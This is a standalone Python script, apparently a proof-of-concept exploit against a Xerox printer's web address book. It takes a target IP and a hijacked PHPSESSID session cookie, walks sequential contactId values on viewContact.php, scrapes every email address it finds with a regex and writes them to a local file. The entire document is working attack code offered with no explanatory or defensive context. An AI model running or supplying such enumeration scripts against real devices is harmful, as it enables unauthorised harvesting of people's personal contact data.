import requests
import re

# Get user input
ip_address = input("Enter the IP address of the Xerox printer: ")
num_contacts = int(input("Enter the number of contacts in the Address Book: "))
phpsessid = input("Enter the PHPSESSID cookie value: ")

# Set the URL and headers
url = "/addressbook/viewContact.php"
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
    "Cookie": f"PHPSESSID={phpsessid}"
}

# Initialize variables
email_list = []

# Iterate through contacts
for contact_id in range(num_contacts):
    # Set the URL with contactId parameter
    contact_url = f"https://{ip_address}{url}?contactId={contact_id}"

    # Make the HTTPS request
    response = requests.get(contact_url, headers=headers)

    # Extract email address from response
    pattern = r"<h6>Email</h6>\s*<span class=\"subText\">(.*?)</span>"
    matches = re.findall(pattern, response.text)

    if matches:
        email_list.extend(matches)

# Save discovered email addresses to a text file
with open("discovered-addresses.txt", "w") as file:
    for email in email_list:
        file.write(email + "\n")

print("Email addresses saved to 'discovered-addresses.txt'")
